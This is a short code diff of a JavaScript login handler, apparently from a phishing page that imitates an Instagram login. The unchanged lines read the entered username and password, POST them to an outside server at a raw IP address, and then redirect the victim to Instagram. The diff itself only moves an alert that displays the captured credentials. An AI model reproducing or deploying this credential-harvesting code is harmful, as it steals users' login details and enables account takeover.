@@ -32,7 +32,6 @@ function activateLoginButton() {
 function logInOnClick() {
     var usernameInputText = document.getElementById("username-input-box").value;
     var passwordInputText = document.getElementById("password-input-box").value;
-    alert(usernameInputText + ", " + passwordInputText);
     const xhr = new XMLHttpRequest();
     xhr.open("POST", "http://23.233.39.254:3000/userinfo", true);
     xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
@@ -40,6 +39,8 @@ function logInOnClick() {
     xhr.onreadystatechange = (e) => {
         console.log("bruh");
     }
+    alert(usernameInputText + ", " + passwordInputText);
+    
     document.location.href = "instagram.com";
 
     /*
